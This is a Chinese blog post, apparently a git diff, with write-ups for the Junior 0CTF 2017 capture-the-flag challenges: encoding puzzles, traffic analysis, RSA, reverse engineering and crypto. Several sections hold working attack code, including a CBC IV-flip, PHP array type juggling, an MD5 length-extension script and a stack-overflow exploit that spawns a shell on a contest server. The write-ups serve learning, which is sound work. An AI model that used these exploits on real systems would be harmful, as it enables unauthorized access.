@@ -1,0 +1,502 @@
+---
+layout:     post
+title:      "Junior 0CTF 2017 WriteUp (部分)"
+tags:
+    - CTF
+---
+
+> “flag{php_is_best_language_:P}”
+
+## 前言
+
+SJTU 0ops 举办的0CTF校内交流赛，12月9号到10号。部分题目索引如下（文中涉及的文件下载[[链接](/docs/in-post/Junior0ctfQuestion.zip)]
+
+[QQ Group ](#j0)|[Mystery Numbers ](#j1)|[Easy Traffic Analyze ](#j2)|[AES-server](#j3)
+[babyrsa ](#j4)|[Shatter Sha512!](#j5)|[Penetrate In ](#j6)|[Eva](#j7)
+[babyre](#j8)|[encoder ](#j9)|[seabreeze’s stack ](#j10)|[aes-duet ](#j11)
+
+## Solved
+
+<p id = "j0"></p>
+### 0.QQ Group 50
+
+友情送分题，加入QQ交流群送一个flag。
+
+<p id = "j1"></p>
+### 1.Mystery Numbers 100
+
+题目描述没有什么实质性内容。给了一个link[[numbers_f300d7d6dce847a265407e072790370d](https://ctf.0ops.sjtu.cn/attachment/download/signal.txt)]，下载得到一个文本文件，内容如下
+
+```shell
+5a6d78685a33746b4d4639354d48566661323477643139694e44557a4e6a52666144526f4e4638324e44593058336b3065545239
+```
+
+因为看到全是字母与数字的排列，而且范围是0到f，应该是一串16进制的编码，以16进制解码到ascii，得到如下内容
+
+```shell
+ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9
+```
+应该还是一串被加密的字符，观察密文形式，很像base64，尝试用它来解码，得到flag。
+
+```python
+import base64
+s = 'ZmxhZ3tkMF95MHVfa24wd19iNDUzNjRfaDRoNF82NDY0X3k0eTR9'
+a = base64.b64decode(s)
+
+>>flag{d0_y0u_kn0w_b45364_h4h4_6464_y4y4}
+```
+<p id = "j2"></p>
+### 2.Easy Traffic Analyze 200
+
+题目给了一个link[[flag.pcap](https://ctf.0ops.sjtu.cn/upload/flag.pcap)]，是一个通信包文件，但是用wireshark打开提示格式不正确，应该是pcap文件受损。需要先修复pcap，可以使用[[pcapfix](https://f00l.de/pcapfix/)]软件来修复。
+
+之后使用wireshark打开，通信包有很多，过滤一下http请求，发现只有3个
+
+![img](/images/in-post/post-blog-jserv8.png)
+
+选择“文件” -> "导出对象" -> “HTTP”将其导出，得到三个文件。
+
+![img](/images/in-post/post-blog-jserv0.png)
+
+其中upload.php很大，有1.9M，以二进制打开，发现文件里有flag1.png，同时有一个zip文件标志头信息504B 0304。
+
+![img](/images/in-post/post-blog-j0serv1.png)
+
+将前面不重要的部分删去，得到的文件更改后缀名为zip解压，得到一张图（还挺好看的 (●ﾟωﾟ●)。
+
+![img](/images/in-post/post-blog-jserv2.png)
+
+这里一般的套路是会在图片里隐写信息，将图片以二进制打开，因为文件比较大，在中间寻找flag较困难，考虑到简单的隐写一般在文件结尾处，直接去文件尾查询，得到了flag。
+
+![img](/images/in-post/post-blog-jserv3.png)
+
+<p id = "j3"></p>
+### 3.AES-server 100
+
+题目给出“nc 202.121.178.199 9999” 与一个文件[[server.py](https://ctf.0ops.sjtu.cn/attachment/download/server.py)]，其中nc是linux的netcat指令，具体介绍可以自己搜索，在此题中不是重点部分。server.py文件内容如下，也即是服务器上的代码。
+
+```shell
+#!/usr/bin/env python
+# coding=utf-8
+
+import SocketServer
+from Crypto.Cipher import AES
+
+with open('secretkey', 'rb') as f:
+    key = f.read()
+with open('flag.txt') as f:
+    flag = f.read()
+
+class handler(SocketServer.BaseRequestHandler):
+
+    def handle(self):
+        self.request.send("Welcome to the perfect aes-cbc cryptosystem!(decrypt-only)\n")
+        self.request.send("Please input your iv and encrypted message in hex:\n")
+        
+        data = self.request.recv(1024).rstrip()
+        try:
+            raw_data = data.decode('hex')
+        except Exception, e:
+            self.request.send("Error: {}\n".format(e.message))
+            self.request.close()
+            return
+
+        if len(raw_data) < 32 or len(raw_data) & 0xf:
+            self.request.send("Your input is not valid!\n")
+            self.request.close()
+            return
+        
+        iv = raw_data[:16]
+        enc = raw_data[16:]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        plain = cipher.decrypt(enc)
+        self.request.send("Here is your plaintext: {}\n".format(repr(plain)))
+
+        if plain[:5] == 'admin':
+            self.request.send("hello, admin! Here is your flag: {}".format(flag))
+        self.request.close()
+
+
+if __name__ == "__main__":
+    HOST, PORT = "localhost", 9999
+    server = SocketServer.TCPServer((HOST, PORT), handler)
+    server.serve_forever()
+```
+
+代码里显示**AES.MODE_CBC**，说明采用的是CBC(密文分组链接)模式，且代码为CBC的解密过程，CBC decryption见下图
+
+![img](/images/in-post/post-blog-jserv9.png)
+
+代码内容只涉及了一组CBC的解密。要求输入初始向量iv与加密字符c的拼接串，同时服务器会返回解密后的明文p。数据关系为 p = XOR( iv, fk(c) )，题目显示需要得到的p前5位为“admin”才会返回flag。
+
+这里使用异或运算的trick来求解。先自己构造一对iv0，c0，服务器会返回一个p0，记目标初始向量（ “admin……….”）为iv1。p0 = XOR( iv0, fk(c0) )，XOR( iv1, p0 ) = a = XOR( iv1, XOR( iv0, fk(c0) ) ) ，于是得到了XOR( iv1, fk(c0) ) = XOR( a, iv1 ) = b。因为是自己构造的，a与b都是可计算的值。也就是只要再次发送报文，初始向量为iv1，密文还为c0即可。
+
+这里构造iv0, c0为全0字节，admin后面也以0补齐，具体过程见下图。（由此可见异或运算的问题还是挺大的，但是异或在加密中广为应用。
+
+![img](/images/in-post/post-blog-jserv4.png)
+
+```shell
+>>nc 202.121.178.199 9999
+>>0000000000000000000000000000000000000000000000000000000000000000
+>>python
+>>'_\xf7;>\xca\xdeQ\x16\x96\xe4y\xa7\x92\xfc\x9b\xbd'.encode('hex')
+>>'admin\00\00\00\00\00\00\00\00\00\00\00'.encode('hex')
+>>hex(0x5ff73b3ecade511696e479a792fc9bbd^0x61646d696e0000000000000000000000)
+>>exit()
+>>nc 202.121.178.199 9999
+>>3e935657a4de511696e479a792fc9bbd00000000000000000000000000000000
+```
+
+<p id = "j4"></p>
+### 4.babyrsa 100
+
+题目提供了一个压缩文件[[babyrsa.zip](https://ctf.0ops.sjtu.cn/attachment/download/babyrsa.zip)]，包含RAS加密的公钥，密文，现在需要求明文。
+
+首先从publicKey.pem中提取n，e
+
+```python
+from Crypto.PublicKey import RSA
+pub = RSA.importKey(open('./publicKey.pem').read())
+n = long(pub.n)
+e = long(pub.e)
+
+>>n = 39845701744153150941069529194757526450699838667585381414738119544695931460213
+>>e = 65537
+```
+
+这个公钥的问题出在n选择太小，直接暴力破解质因数，这里可以去[[factordb](http://www.factordb.com)]网站查询，也可以用python的包进行破解。(最开始是用python暴力破的，后来发现可以查询到)
+
+![img](/images/in-post/post-blog-j0serv7.png)
+
+在质因子p，q都得到的情况下，后面就是顺水推舟的求私钥d，解明文p了。
+
+<p id = "j5"></p>
+### 5.Shatter Sha512! 150
+
+题目描述“Google Shatter Sha256, so cooooooooooool! Can you break the sha512 algorithm to prove that you are a great genius?” 下面是一个链接，点进去是一个页面，显示如下内容，需要找到两个不同的值x和y，使得hash值一样。
+
+![img](/images/in-post/post-blog-jserv5.png)
+
+题目说要攻破SHA512，显然目前是不可能的，于是需要找php的漏洞，使得x与y不等但是hash值相等。由于参数传递为GET方法，可以在参数上做手脚，使用如下url
+
+```shell
+202.121.178.201：8083?x[]=1&y[]=2
+```
+
+不等条件显然成立，这里x与y都成为**Array**类型，hash值都为**Null**，于是echo $flag. 
+
+**flag{php_is_best_language_:P}** 被这个漏洞震惊了，果然PHP是最好的语言。
+
+<p id = "j6"></p>
+### 6.Penetrate In 150
+
+（来自dusmart大大）此题感觉比较复杂，需要详细说明一下，但是很多人很早就做了出来，不知道用的什么方法。链接点进去是如下界面
+
+![img](/images/in-post/post-blog-jserv6.png)
+
+第一次访问会设置一个名为“hmac"的cookie，之后要求以POST的方式提交username与password，其中username字段必须为“admin”，password字段不能为“admin”，但是要求hamc与md5(" $secret\|$username\|$password")相等。
+
+#### 心路历程：
+
+1. 第一次访问该网站时，被设置了一个hmac字段的cookie，该hmac表示的是`md5("$secret|admin|admin")`，实际内容为"be9fcfa876db5f4184e1635ce6561de7"。
+2. 第一想法当然是尝试破解\$secret变量，用C++测试了6位以内所有可打印ascii码的组合，并没有找到使得`md5("$secret|admin|admin")`等于给定值的组合。然后使用了常用密码组合表去重复同样的操作，未果。
+3. 然后将思路转移到php本身的缺陷上来，观察到第六行使用了 != 符号，因此在提交数据时，构造字段`payload = {"username":"admin","password[]":"admin"}`，发现虽然第六行的比较通过，但是在第七行时校验不通过，因为该字符串变成了$secret\|admin\|Array，因此放弃了寻找php本身的漏洞。
+4. 第三次尝试从md5本身去下手，因为cookie在本地，可以被我们自己修改，因此考虑能否在$secret无法获取的情况下计算出md5("$secret\|admin\|xxxxxxx")，其中xxxxxx为我们可控制的password字段，不能为admin)。
+
+#### 解题思路：
+
+1. 首先观察md5的整体过程，上半部分指出首先要对消息做填充，填充至512bit的整数倍，该图的下半部分显示了md5的整体计算过程，被哈希的消息Y被分割为长度为512bit的分组(Y0,Y1,...,Yn-1)，计算过程为：
+
+   1. $H0=Hmd5(IV, Y0)$
+
+   2. $Hi = Hmd5(Hi-1, Yi)$
+
+   3. 最终有 $md5(Y) = Hn-1$
+
+      *IV是初始向量，是固定值0x0123456789ABCDEFFEDCBA9876543210*
+
+      *Hmd5表示md5中的每个分组的哈希操作，其输入为初始向量和512bit的待哈希分组，输出为128bit*
+
+![md5](/images/in-post/post-blog-jserv10.png)
+
+2. 然后了解消息填充的具体过程
+
+   在MD5算法中，首先需要对信息进行填充，使其位长对512求余的结果等于448，**并且填充必须进行，即使其位长对512求余的结果等于448**。因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。然后在这个结果后面附加一个以64位二进制数字表示扩充前实际信息的长度（小端序）。
+
+   [来自百度百科的例子](https://baike.baidu.com/item/MD5/212708?fr=aladdin#3_2)
+
+3. 最后，我们分析题目条件，题目给出了**src = md5(\$secret\|admin\|admin)**，我们需要构造一个**des = md5(\$secret\|admin\|xxxxxx)**，其中$secret长度未知，xxxxxx不能为admin，长度随意。很容易想到如果我们的md5(\$secret\|admin\|xxxxxx)的生成过程和md5(\$secret\|admin\|admin)的生成过程前半部分相同，但是比其多出一个分组，那么des = Hmd5(src, xxxxxx的后一部分+此次的填充信息)。那么就要求xxxxxx = admin+src构造过程中的填充信息+448bit内的随意值，为了使得des计算方便，我们就令xxxxxx = admin + src构造过程中的填充信息，此时**des = Hmd5(src, des构造过程中的填充信息)**。
+
+4. python代码实现
+
+   为了实现方便，假设src的构造过程只使用了一个分组，即\$secret长度小于43，那么des过程中的填充信息就固定为 ` '\x80'+'\x00'*55 +'\x00\x02'+'\x00'*6 ` ，共512bit，64字节，其中'\x00\x02'表示源消息长度为512bit，而xxxxxx会根据$secret的长度变化而变化，设其长度为length，则src构造过程中的源消息长度为length+12字节，则`xxxxxx = "admin" + "\x80" + "\x00" * (length+12-1) + (length+12的8字节小端表示)`
+
+```
+   import requests
+   bytearr = ['\x00','\x08','\x10','\x18','\x20','\x28','\x30','\x38','\x40','\x48','\x50','\x58','\x60','\x68','\x70','\x78','\x80','\x88','\x90','\x98','\xa0','\xa8','\xb0','\xb8','\xc0','\xc8','\xd0','\xd8','\xe0','\xe8','\xf0','\xf8',]
+   bitarr = ['\x00','\x01','\x02', '\x03', '\x06', '\x07', '\x08', '\x09', '\x0a', '\x0b']
+   length = 42
+   session = requests.Session()
+   for length in range(43):
+           # say origin len < 43
+           origin_len = length + 12
+           padding_len = (56 - origin_len)
+           padding = "\x80" + "\x00" * (padding_len-1)
+           checksum = bytearr[origin_len % 32] + bitarr[origin_len / 32] + '\x00'*6
+           hmac = padding + checksum
+           payload = {'username': 'admin', 'password': 'admin'+padding + checksum}
+           cookie = {'hmac': "5f1b36f358a22a9abe395cba54f6d3bc"}
+           r = session.post("http://202.121.178.201:8081/", cookies=cookie, data=payload)
+           print(r.text)
+```
+
+<p id = "j7"></p>
+### 7.Eva 200
+
+此题出了bug，直接爆出了答案，没有认真做。
+
+For fair consideration, flag is flag{f1ask_is_a_g00d_pyth0n_web_framew0rk}
+
+<p id = "j8"></p>
+### 8.babyre 100
+
+题目给出一个pyc文件[[encrypt.pyc](https://ctf.0ops.sjtu.cn/attachment/download/encrypt.pyc)]，使用在线工具反编译一下[[decompyle](http://tools.bugscaner.com/decompyle/)]，得到python源文件，内容如下。
+
+```python
+from hashlib import md5
+ 
+def md5raw(s):
+    return bytearray(md5(s).digest())
+ 
+ 
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytearray([ i ^ j for i, j in zip(a, b) ])
+ 
+ 
+flag = bytearray(raw_input('Show me your flag: '))
+assert len(flag) == 32
+for i in range(16):
+    flag[:16] = xor(flag[:16], md5raw(flag[16:]))
+    flag[:16], flag[16:] = flag[16:], flag[:16]
+ 
+if flag == '\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n':
+    print 'Right!'
+else:
+    print 'Wrong!'
+```
+
+这个看代码是典型的Feistel加密，Feistel结构如下，每轮涉及异或与互换，解密就是把过程逆回去。
+
+![img](/images/in-post/post-blog-jserv11.png)
+
+```python
+from hashlib import md5
+def md5raw(s):
+    return bytearray(md5(s).digest())  
+def xor(a, b):
+    assert len(a) == len(b)
+    return bytearray([ i ^ j for i, j in zip(a, b) ])
+flag = bytearray('\xa5\xc6\xe6\xeca\x0c:ED\xed#\x19\x94LF\x11\x17\xc4.\xeb\xa1\xc2|\xc1<\xa9\\A\xde\xd22\n')
+
+for i in range(16):
+    flag[16:] = xor(flag[16:], md5raw(flag[:16]))
+    flag[:16], flag[16:] = flag[16:], flag[:16]
+    print(flag)
+
+print(flag)
+
+>>flag{1nt3re5tiNg_F3iste1_ciPh3R}
+```
+
+<p id = "j9"></p>
+### 9.encoder 200
+
+逆向题目，链接为[[encoder.zip](https://ctf.0ops.sjtu.cn/attachment/download/encoder.zip)]，解压后一个名为encoder的可执行文件，一个加密后的flag"KNByeN88KqslM52E1L67aYREK1qQ2N1QydYlaEd="。执行encoder，发现就是一个加密算法，输入明文，返回密文。那么解题思路就是找到上述密文对应的明文就是flag。
+
+![img](/images/in-post/post-blog-jserv12.png)
+
+使用IDA打开encoder进行分析。`main`函数如下，主要调用了`sub_4006D6()`这个函数
+
+![img](/images/in-post/post-blog-jserv13.png)
+
+函数`sub_4006D6()`内容如下，是主要的加密过程
+
+![img](/images/in-post/post-blog-jserv14.png)
+
+在函数`sub_4006D6()`内使用了两个数组（上图红线部分），数组内容如下。注意`byte_601080[]`第一位为`61h`是字符a，所以数组内容为`'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'`，解题过程中就遇到了所给密文中有a，而找不到a在哪里的尴尬局面。
+
+![img](/images/in-post/post-blog-jserv15.png)
+
+反编译出的c代码的问题是变量名不易于理解，需要先来理解`sub_4006D6()`的主要过程。main函数中变量`s`为输入字符串的地址，变量`v6`为字符串的长度。于是可以得到`shb_4006D6()`函数中变量`a1`为字符串起始地址，`a2`为字符串长度。接下来`malloc()`函数分配空间，应该是给密文分配空间的，从`8*(len/5+1)+1`可以看出算法是分组加密，每5个字符加密出8个字符。`v7`是将输入字符的一个分组取出来，重点在到`v9[] = byte_601080[v7 & 0x1F]`也就是取`v7`的后5位去`byte_601080[]`中查询一个字符出来反向放置作为加密结果。对于不满足5位的情况在，算法会在后面补上“=”。下面给出一个修改过变量名的版本，易于理解。
+
+```c++
+_BYTE *__fastcall sub_4006D6(unsigned __int64 messagePtr, signed int len)
+{
+  signed int i; // [sp+14h] [bp-2Ch]@4
+  signed int j; // [sp+14h] [bp-2Ch]@9
+  signed int left_len; // [sp+18h] [bp-28h]@2
+  int v6; // [sp+1Ch] [bp-24h]@9
+  unsigned __int64 check_sum; // [sp+20h] [bp-20h]@2
+  unsigned __int64 new_message_ptr; // [sp+28h] [bp-18h]@1
+  _BYTE *group_secret; // [sp+30h] [bp-10h]@1
+  _BYTE *secret; // [sp+38h] [bp-8h]@1
+
+  secret = malloc(8 * (len / 5 + 1) + 1);
+  new_message_ptr = messagePtr;
+  group_secret = secret;
+  while ( len + messagePtr > new_message_ptr )
+  {
+    check_sum = 0LL;
+    left_len = len + messagePtr - new_message_ptr;
+    if ( left_len > 5 )
+      left_len = 5;
+    for ( i = 0; i <= 4; ++i )
+    {
+      check_sum <<= 8;
+      if ( i < left_len )
+        check_sum |= *(_BYTE *)(i + new_message_ptr);
+    }
+    v6 = dword_6010B0[left_len - 1];
+    for ( j = 7; j >= 0; --j )
+    {
+      group_secret[j] = byte_601080[check_sum & 0x1F];
+      check_sum >>= 5;
+    }
+    if ( v6 )
+      memset(&group_secret[8LL - v6], 61, v6);
+    new_message_ptr += 5LL;
+    group_secret += 8;
+  }
+  *group_secret = 0;
+  return secret;
+}
+```
+那么解密过程就是，对于密文的每8个字符的分组，去```byte_601080[]```中查询index
+
+```python
+def decode(secret):
+    table = 'afe7WlyVd12XKLhnqvzQb5B6sNR8gYME'
+    message = [0]*40
+    string = ['']*5
+
+    for i, ch in enumerate(secret):
+        index = table.index(ch)
+        print(index)
+        start = (8-i)*5-5
+        while index!=0:
+            message[start] = index % 2
+            #print (message,start,index)
+            index >>= 1
+            start += 1
+
+    for i in range(5):
+        num = 0
+        for j in range(i*8+7, i*8-1, -1):
+            num <<= 1
+            num += message[j]
+        string[i] = chr(num)
+    print(string)
+    return string[::-1]
+
+print("".join(decode("KNByeN88")+decode("KqslM52E")+decode("1L67aYRE")+decode("K1qQ2N1Q")+decode("ydYlaEd")))
+
+>>flag{d0_U_Kn0w_ba5e32:P}
+```
+
+最终flag提示do u know base32，其实最开始看到密文结尾为=就尝试用了base64
+
+<p id = "j10"></p>
+### 10.seabreeze's stack 100
+
+题目内容为“nc 202.121.178.181 12321”与一个下载链接[[stack_55a49bdfcdafd0c31657649e905486a4](https://ctf.0ops.sjtu.cn/attachment/download/stack)]，得到一个名为stack的二进制文件。使用strings指令查看一下内部字符内容
+
+![img](/images/in-post/post-blog-jserv16.png)
+
+可以看到Shell Gotten与三个问题。执行nc指令
+
+![img](/images/in-post/post-blog-jserv17.png)
+
+需要回答的问题与文件中的内容一致，但是之后还需要输入内容。根据上文的Sell Gotten，显然这里我们需要得到shell的控制权，再根据题目名字stack，考虑为栈溢出问题。
+
+使用IDA-win32打开，main函数的主体是work函数，work函数如下，就是之前要回答的三个问题。
+
+![img](/images/in-post/post-blog-jserv18.png)
+
+还有一个没有用到的函数getshell()
+
+![img](/images/in-post/post-blog-jserv19.png)
+
+只需要程序的返回地址为getshell()的地址，就会触发执行了。查询得到getshell的起始地址为0804 85cb
+
+![img](/images/in-post/post-blog-jserv20.png)
+
+栈溢出的原理可以参考链接[[栈溢出](https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/stackoverflow_basic.html)]
+
+```python
+from zio import *
+from pwn import *
+io = zio(('202.121.178.181', 12321 ))
+io.read_until('Do you want to get acquainted with top experts and like-minded friends in computer security?')  
+io.writeline('Yes!')  
+io.read_until('Do you want to stride forwards on the road of hacking and explore endless possibilities?')  
+io.writeline('Yes!!')
+io.read_until('Do you want to challenge world cutting-edge technology and compete with outstanding hackers?')
+io.writeline('Yes!!!')
+success_addr = 0x080485cb
+payload = 'a' * 0x3fc + "bbbb" + p32(success_addr)
+io.writeline(payload)  
+io.interact()  
+```
+
+运行代码
+![img](/images/in-post/post-blog-jserv21.png)
+
+cd 进入 /home/.../stack 目录，cat 显示flag。
+![img](/images/in-post/post-blog-jserv22.png)
+
+## Have Idea
+
+<p id = "j11"></p>
+### 11.aes-duet
+
+题目描述为一个链接[[aes_duet.zip](https://ctf.0ops.sjtu.cn/attachment/download/aes_duet.zip)]，解压得到一个密文和加密函数，文件如下
+
+```python
+from Crypto.Cipher import AES
+def dummy_key_extend(k):
+    assert len(k) == 4
+    return k * 4
+
+def aes_duet(plain, key):
+    # It is so safe that I use AES twice here!
+    assert len(key) == 8
+    k1 = dummy_key_extend(key[:4])
+    k2 = dummy_key_extend(key[4:])
+    c1 = AES.new(k1, AES.MODE_ECB)
+    c2 = AES.new(k2, AES.MODE_ECB)
+    return c2.encrypt(c1.encrypt(plain))
+if __name__ == '__main__':
+    with open('./secretkey', 'rb') as f:
+        key = f.read()
+    # To make life easier...
+    assert (key.encode('hex'))[0] == '0'
+    assert (key.encode('hex'))[-1] == '8'
+    
+    plain = 'I am a piece of lovely plaintext'
+    with open('ciphertext', 'wb') as f:
+        f.write(aes_duet(plain, key))
+    print "I am a lovely flag: flag{ %s}" % key.encode('hex')
+```
+
+思路很简单，就是AES两轮加密的中间相遇攻击，虽然题目为了降低复杂性提示了key的第一位为0最后一位为8，但是计算量还是十分庞大，需要很多内存，而且计算出来中间值后，查询也会耗时，加上心里的“B树”和“B+树”早忘的没影了，最终因为时间与硬件原因放弃。
+
+## 感想
+
+程序的安全性与正确性同等重要。
+
+我们在众多bug中微妙的生活着。
+
+PHP是世界上最好的语言。
+
+![img](/images/in-post/post-blog-j0serv8.gif)
